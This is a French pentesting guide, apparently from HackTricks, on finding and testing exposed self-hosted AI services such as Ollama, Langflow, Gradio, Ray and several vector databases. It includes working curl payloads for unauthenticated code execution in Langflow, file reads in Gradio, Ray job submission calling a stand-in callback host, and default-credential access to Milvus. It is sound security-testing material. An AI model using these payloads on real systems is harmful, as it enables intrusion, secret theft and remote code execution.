# Services d’IA auto-hébergés exposés

{{#include ../banners/hacktricks-training.md}}

Les équipes qui développent des fonctionnalités d’IA exécutent souvent leurs propres moteurs de modèles, outils de création d’agents, interfaces de démonstration, clusters de calcul et bases de données vectorielles. Beaucoup de ces outils ont été conçus pour un ordinateur portable ou un réseau de laboratoire fermé ; ils **n’ont donc aucune authentification par défaut** ou sont livrés avec un raccourci d’authentification activé. Lorsqu’un attaquant peut accéder à un tel service, les conséquences se répartissent généralement dans l’une des catégories suivantes :

- Utilisation gratuite des GPU et des modèles, et vol de modèles privés.
- Fuite de prompts, de documents et d’embeddings.
- Fuite de secrets de l’environnement du processus (clés de fournisseurs LLM, identifiants cloud).
- Exécution de code, car certaines de ces API exécutent du code **comme fonctionnalité**.

Cette page explique comment trouver ces services et quels tests effectuer sur chaque type d’API. Pour renforcer la sécurité d’un serveur d’inférence auto-hébergé et de la fuite llama.cpp `/slots`, voir [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Pour les fichiers de modèles malveillants, voir [AI Models RCE](AI-Models-RCE.md).

## Identification

Envoyez ces requêtes sans identifiants. Une réponse JSON contenant les champs attendus permet d’identifier le produit et souvent sa version, ce qui indique quels contrôles ci-dessous s’appliquent. Les ports sont les valeurs par défaut documentées ou ceux utilisés dans les exemples d’exécution officiels.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produit | Port courant | Requête sans authentification | Élément d’identification |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON de version, liste des modèles locaux |
| Langflow | 7860 | `GET /api/v1/version` | JSON de version de Langflow |
| Gradio | 7860 | `GET /config` | Configuration de l’application avec la version de Gradio et les ID des composants |
| Tableau de bord Ray | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, liste des tâches soumises |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Valeur du heartbeat, version de Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Version de Qdrant, liste des collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Version de Weaviate, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Liste des collections ou erreur d’authentification |

Ces services sont aussi souvent publiés derrière un reverse proxy sous un préfixe de chemin (par exemple `/ollama/` ou `/ray/`). Répétez donc les requêtes sous tout préfixe trouvé dans les bundles JavaScript ou la documentation des API.

## API d’inférence et de gestion des modèles sans authentification

Les moteurs de modèles exposent généralement une seule API REST qui regroupe les routes d’inférence et les routes administratives. Ollama en est un bon exemple. Il n’intègre aucune authentification et se lie à `127.0.0.1:11434` par défaut, tandis que `OLLAMA_HOST` modifie l’adresse de liaison.<sup>[[1]](#references)[[15]](#references)</sup> L’image Docker officielle définit `OLLAMA_HOST=0.0.0.0:11434` dans le conteneur, déclare `EXPOSE 11434` et ne contient aucune instruction `USER`, de sorte que le serveur s’exécute en tant que root dans le conteneur.<sup>[[16]](#references)</sup> `EXPOSE` ne publie pas le port sur l’hôte ; l’accessibilité depuis l’hôte dépend donc du déploiement. Les commandes `docker run` documentées utilisent `-p 11434:11434`, et Docker publie un tel mappage sur toutes les interfaces de l’hôte, sauf si une adresse IP de l’hôte est indiquée.<sup>[[17]](#references)[[18]](#references)</sup>

Ce que chaque groupe de routes permet à un attaquant :<sup>[[2]](#references)</sup>

| Routes | Impact sans authentification |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Liste des modèles locaux et chargés, y compris les modèles personnalisés privés |
| `POST /api/show` | Détails du modèle, dont le Modelfile, le template et le **prompt système** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inférence gratuite sur le matériel de la victime |
| `POST /api/pull`, `/api/push` | Faire télécharger un modèle au serveur depuis un registre choisi par l’attaquant, ou l’y téléverser |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Créer, écraser ou supprimer des modèles |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Une liste de modèles renvoyée sans identifiants prouve déjà l’exposition. Les modèles personnalisés contiennent souvent un prompt système interne dans `/api/show`. Un pull vers votre hôte prouve que le serveur récupère des manifests depuis des registres choisis par l’attaquant. Un `/api/push` vers votre registre transforme l’exposition en vol de modèle. N’appelez pas les routes create ou delete sur des cibles réelles.

Les pulls depuis un registre constituent aussi une surface d’attaque du parseur, car le serveur stocke les blobs en utilisant les valeurs du manifest distant. Dans Probllama (CVE-2024-37032, corrigé dans Ollama 0.1.34), le `digest` du manifest était utilisé comme nom de fichier sans validation. Un registre malveillant pouvait donc écrire des fichiers hors du répertoire des blobs à l’aide de séquences `../`. En envoyant un manifest piégé dont le digest pointait vers un fichier local, l’attaquant pouvait leaker ce fichier vers son registre. Wiz a obtenu une RCE dans Docker, où le serveur s’exécute en tant que root, en écrivant une bibliothèque partagée et en l’ajoutant à `/etc/ld.so.preload`, puis en appelant `/api/chat` pour qu’un nouveau processus la charge.<sup>[[15]](#references)</sup> Lorsqu’un runner peut récupérer des données depuis des registres arbitraires, vérifiez comment il convertit les champs du manifest en chemins.

## API conçues pour exécuter du code

### API de soumission de jobs

Les frameworks de calcul distribué font de l’exécution de code leur fonctionnalité principale. L’API Ray Jobs, sur le port du dashboard (8265), accepte une commande shell `entrypoint` et l’exécute sur le cluster.<sup>[[19]](#references)</sup> Les recherches d’Oligo sur ShadowRay indiquent que l’API Jobs n’a pas d’autorisation et que le dashboard est lié à `0.0.0.0`. Le CVE-2023-48022 correspondant est contesté, car Ray est censé s’exécuter uniquement dans un réseau contrôlé.<sup>[[20]](#references)</sup> Ray a ajouté une authentification facultative par token (`RAY_AUTH_MODE=token`) dans la version 2.52.0. Ray 2.59 l’active par défaut pour les clusters locaux lancés avec `ray.init()` ; `ray start --head` peut toujours démarrer sans authentification si aucun token n’est disponible. Ray documente un déploiement plus large de l’authentification par défaut pour la version 2.61 : vérifiez donc la version déployée et le mode de lancement au lieu de supposer que le dashboard est ouvert.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Les tableaux de bord de ce type ont aussi des routes auxiliaires qui méritent d’être testées sur les anciennes versions. Avant Ray 2.8.1, `/log_proxy?url=` récupérait n’importe quelle URL HTTP(S) (SSRF vers les métadonnées du cloud) et `/api/v0/logs/file` acceptait un chemin `filename` arbitraire, les deux sans authentification.<sup>[[8]](#references)</sup>

### Endpoints de « validation » de code qui exécutent des définitions de fonction

Les outils de création d’agents qui acceptent des composants Python personnalisés « valident » parfois le code en l’analysant avec `ast` et en exécutant uniquement les définitions de fonction avec `exec()`. Ce n’est pas sûr. Python évalue **les décorateurs et les valeurs par défaut des arguments lors de la définition de la fonction** : le code placé à ces endroits s’exécute même si le corps de la fonction n’est jamais exécuté. Le endpoint `POST /api/v1/validate/code` de Langflow fonctionnait ainsi et ne nécessitait aucune authentification avant la version 1.3.0 (CVE-2025-3248). Lever une exception contenant la sortie de la commande permet au endpoint de renvoyer cette sortie dans la réponse :<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Testez tout endpoint qui compile, lint ou « vérifie » le code utilisateur à la recherche de ce pattern, et privilégiez un DNS callback comme preuve.

### Routes d’auto-login et de token superuser par défaut

Les outils mono-utilisateur incluent souvent un raccourci qui connecte chaque visiteur en tant qu’administrateur. Dans Langflow, lorsque `AUTO_LOGIN` est activé, `GET /api/v1/auto_login` renvoie des tokens du superuser par défaut à n’importe quel appelant. Lorsqu’il est désactivé, la route répond `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 à 1.10.0 l’activait par défaut (CVE-2026-9103). En le combinant avec la route authentifiée de validation de code ci-dessus, on rétablit une RCE sans authentification (CVE-2026-9198, signalée par Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Les packages des versions officielles actuelles et les images Docker désactivent l’auto-login et exigent un mot de passe superuser, mais les branches de développement le gardent activé.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Même sans exécution de code, un token de superutilisateur donne accès à tous les flows et aux identifiants stockés des fournisseurs. Pour un contrôle préalable similaire dans les tests automatisés, voir [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Routes de service de fichiers et RPC dans les interfaces de démonstration ML

Les frameworks de démonstration ML servent les fichiers téléversés et générés via une route générique et permettent au frontend d’appeler des helpers côté serveur des composants. Gradio expose `/config`, `/upload` et `/file=<path>` à cet effet.<sup>[[5]](#references)</sup> Deux schémas méritent d’être testés sur tout framework similaire :

- **Traversal depuis un sous-répertoire d’upload :** si la route de fichier vérifie uniquement que le chemin commence dans le dossier temporaire, téléversez un fichier pour créer un sous-répertoire, puis remontez dans l’arborescence avec `../` ou `%2e%2e%2f`. Gradio 4.0 à 4.10 (CVE-2023-51449) était vulnérable de cette manière.<sup>[[26]](#references)[[27]](#references)</sup> Envoyez la requête avec `curl --path-as-is` pour que le client ne normalise pas le chemin.
- **Dispatch arbitraire de méthodes :** un endpoint qui appelle `getattr(component, fn_name)` avec une entrée utilisateur permet à l’attaquant d’appeler des helpers internes. Avant la version 4.13.0, le `/component_server` de Gradio faisait cela. Dans les versions 4.3 à 4.12, `move_resource_to_block_cache` copiait n’importe quel fichier local dans le cache, où `/file=` permettait de le télécharger. Dans les versions 3.47 à 3.50.2, d’autres helpers permettaient la lecture de fichiers et un SSRF avec lecture complète.<sup>[[26]](#references)[[28]](#references)</sup> Un serveur corrigé répond `Function not found.` pour les helpers qui ne sont pas marqués comme fonctions serveur.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Sur Hugging Face Spaces, les secrets du Space sont des variables d’environnement ; `/proc/self/environ` est donc le fichier le plus précieux. Horizon3 l’a lu avec un en-tête HTTP `Range`.<sup>[[26]](#references)</sup>

## Bases de données vectorielles utilisées par RAG

RAG stocke des segments des documents d’origine, leurs embeddings et leurs métadonnées dans une base de données vectorielle, puis l’assistant place les meilleurs résultats dans son prompt. L’accès en lecture divulgue donc le **texte brut de documents privés**. L’accès en écriture permet à un attaquant d’insérer des segments qui seront ensuite récupérés dans les prompts d’autres utilisateurs, ce qui constitue une injection de prompt indirecte persistante (voir [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Pour les bases de données vectorielles auto-hébergées, vérifiez si l’authentification est configurée ou si l’accès anonyme est activé :

- **Qdrant** : les instances déployées par l’utilisateur écoutent sur toutes les interfaces sans authentification. Lorsqu’une clé est configurée, elle est transmise dans l’en-tête `api-key` ou sous la forme `Authorization: Bearer`. Des clés en lecture seule et limitées à une collection peuvent exister.<sup>[[11]](#references)</sup>
- **Chroma** : l’authentification est désactivée par défaut. L’authentification par token utilise `Authorization` ou `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate** : les requêtes sans identifiants sont authentifiées en tant que `user: anonymous` lorsque l’accès anonyme est activé, et disposent des autorisations attribuées à cet utilisateur.<sup>[[30]](#references)</sup>
- **Milvus** : l’authentification est désactivée, sauf si `common.security.authorizationEnabled` vaut `true`. Lorsqu’elle est activée, l’utilisateur `root` par défaut a pour mot de passe `Milvus` et le format du token est `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Une réponse contenant des données privées sans identifiants indique une exposition. Lorsque l’authentification est activée, évaluez séparément tout compte par défaut dont les identifiants n’ont pas été modifiés :<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Vérifiez si les payloads contiennent du texte de documents, des identifiants utilisateur ou des noms de tenant. Pour démontrer un accès en écriture sans altérer les données de production, créez puis supprimez immédiatement une collection vide au nom explicite, et uniquement si le périmètre l'autorise.

L'authentification sur ces serveurs peut aussi intervenir trop tard. Dans le serveur Python FastAPI de Chroma (de la version 1.0.0 à au moins la version 1.5.8, CVE-2026-45829), la route de création de collection construisait la fonction d'embedding fournie par le client avant la vérification d'authentification. Une configuration faisant référence à un modèle Hugging Face contrôlé par l'attaquant avec `trust_remote_code: true` exécutait le code de l'attaquant, même lorsque la requête était rejetée. Le frontend Rust n'était pas concerné.<sup>[[32]](#references)</sup> Lorsqu'une requête contient une configuration de modèle ou de plugin, testez-la sans identifiants et surveillez toute requête sortante vers votre dépôt de modèles.

## References

- [1] [FAQ Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Documentation de l'API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README de Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Code source de Langflow - Points de terminaison de l'API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Code source de Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Code source de Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Code source de Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, versions 2.6.3 et 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Code source de Chroma - Valeurs par défaut du client Python](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Code source de Chroma - Routes du serveur FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Sécurité](https://qdrant.tech/documentation/security/)
- [12] [Spécification OpenAPI de Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Spécification OpenAPI de Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Se connecter au serveur Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama : vulnérabilité d'exécution de code à distance dans Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile d'Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Documentation Docker d'Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Publier et exposer des ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [API REST des tâches Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay : première campagne d'attaque connue ciblant des workloads d'IA, exploitée dans la nature](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Authentification par jeton de Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Dangereux à toute vitesse : abus de Python Exec pour une RCE non authentifiée dans Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Code source de Langflow - Routeur de connexion](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Exploiter les vulnérabilités de lecture de fichiers dans Gradio pour voler des secrets de Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Avis de sécurité Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit correctif de Gradio pour `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Authentification native de Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Authentification](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Authentifier l'accès utilisateur](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast servi avant authentification](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Bulletin de sécurité IBM - Exécution de code à distance non authentifiée via le contournement de la connexion automatique et la validation de code (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
